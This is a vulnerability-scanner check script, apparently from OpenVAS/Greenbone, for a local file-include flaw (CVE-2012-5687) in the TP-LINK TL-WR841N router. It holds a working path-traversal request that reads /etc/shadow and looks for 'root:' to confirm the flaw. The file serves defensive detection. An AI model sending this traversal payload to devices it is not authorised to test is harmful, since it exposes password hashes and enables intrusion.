if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103600" );
	script_bugtraq_id( 56320 );
	script_cve_id( "CVE-2012-5687" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_name( "TP-LINK TL-WR841N Router Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/56320" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-10-30 11:42:36 +0100 (Tue, 30 Oct 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "WR841N/banner" );
	script_tag( name: "summary", value: "TP-LINK TL-WR841N router is prone to a local file-include
vulnerability because it fails to sufficiently sanitize user-
supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view files and execute
local scripts in the context of the affected device. This may aid in
further attacks." );
	script_tag( name: "affected", value: "TP-LINK TL-WR841N 3.13.9 Build 120201 Rel.54965n is vulnerable, other
versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "WR841N" )){
	exit( 0 );
}
url = "/help/../../../../../../../../../../../../../../../../../../etc/shadow";
if(http_vuln_check( port: port, url: url, pattern: "root:" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

